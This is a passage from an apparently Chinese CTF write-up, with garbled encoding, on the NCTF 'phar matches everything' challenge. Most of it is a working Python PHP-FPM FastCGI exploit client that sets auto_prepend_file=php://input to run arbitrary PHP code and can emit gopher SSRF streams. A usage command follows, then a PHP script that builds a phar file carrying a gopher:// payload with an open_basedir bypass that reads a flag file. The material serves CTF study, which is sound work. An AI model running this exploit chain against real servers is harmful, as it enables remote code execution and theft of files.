class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">'connect failure! please check your fasctcgi-server !!'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">'response'</span>] = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gopher</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php echo "PWNed";?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line">    parser.add_argument(<span class="string">'-e'</span>, <span class="string">'--ext'</span>, help=<span class="string">'ext absolute path'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-if'</span>, <span class="string">'--include_file'</span>, help=<span class="string">'evil.php absolute path'</span>, default=<span class="string">''</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--url_format'</span>, help=<span class="string">'generate gopher stream in url format'</span>, nargs=<span class="string">'?'</span>,const=<span class="number">1</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-b'</span>, <span class="string">'--base64_format'</span>, help=<span class="string">'generate gopher stream in base64 format'</span>, nargs=<span class="string">'?'</span>,const=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(args.code),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.ext <span class="keyword">and</span> args.include_file:</span><br><span class="line">        <span class="comment">#params['PHP_ADMIN_VALUE']='extension = '+args.ext</span></span><br><span class="line">        params[<span class="string">'PHP_ADMIN_VALUE'</span>]=<span class="string">"extension_dir = /var/www/html\nextension = ant.so"</span></span><br><span class="line">        params[<span class="string">'PHP_VALUE'</span>]=<span class="string">'auto_prepend_file = '</span>+args.include_file</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.url_format <span class="keyword">and</span> <span class="keyword">not</span> args.base64_format :</span><br><span class="line">        response = client.request(params, args.code)</span><br><span class="line">        print(force_text(response))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response = client.gopher(params, args.code)</span><br><span class="line">        <span class="keyword">if</span> args.url_format:</span><br><span class="line">            print(urllib.quote(response))</span><br><span class="line">        <span class="keyword">if</span> args.base64_format:</span><br><span class="line">            print(base64.b64encode(response))</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ—¶ï¼Œä¾æ®ä¸»æœºipä¿®æ”¹å‚æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 173.0.168.10 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -p 9000 -c &lt;?php phpinfo();?&gt; -u</span><br></pre></td></tr></table></figure><p><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exp"><br>ç”Ÿæˆçš„æ•°æ®æµæˆ‘ä»¬å†åº¦ç”Ÿæˆpharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url=<span class="string">"gopher://173.0.168.10:9000/_%01%01%B4U%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B4U%01%DC%00%00%0E%03CONTENT_LENGTH172%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%B4U%00%00%00%00%01%05%B4U%00%AC%00%00%3C%3Fphp%20mkdir%28%27byc%27%29%3Bchdir%28%27byc%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Becho%28file_get_contents%28%27flag%27%29%29%3B%20%3F%3E%01%05%B4U%00%00%00%00"</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$o=<span class="keyword">new</span> Main();</span><br><span class="line">$p-&gt;setMetadata($o);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span 